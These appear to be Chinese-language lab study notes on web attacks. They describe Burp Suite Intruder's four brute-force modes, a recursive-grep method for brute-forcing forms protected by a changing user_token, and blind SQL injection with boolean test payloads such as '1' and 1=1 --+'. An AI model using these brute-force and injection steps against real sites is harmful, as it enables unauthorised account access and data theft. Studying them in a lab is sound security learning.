爆破操作
Send to Intruder
通过Positions中的clear和add选择爆破的参数
在Payloads中的load加载字典

四种爆破模式

  • Sniper单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变
  • Battering ram 多参数同时爆破，但用的是同一个字典（一对一）
  • Pichfork 多参数同时爆破，但用的是不同的字典（一对一）
  • Cluster bamb 多参数做笛卡尔乘积模式爆破

带有规律性的token验证

  1. 在Options中找到Rediections模块，选择always，允许重定向
  2. 在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token。且只能使用单线程
  3. 在Payloads中为选择的参数设置字典
  4. token参数类型设置为Recursive grep并在*Initial payload for first found *中填入抓取包中的token
  5. 开始爆破

SQL Injection (Blind)盲注

  • 不显示数据库内建的报错信息
    • 内建的报错信息帮助开发人员发现和修复问题
    • 报错信息提供关于系统的大量的有用信息
  • 当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，也即是盲
  • 思路：既然无法给予报错信息判断结果，基于逻辑真假的不用结果来判断
    • 1’ and 1=1 –+
    • 1’ and 1=2 –+’
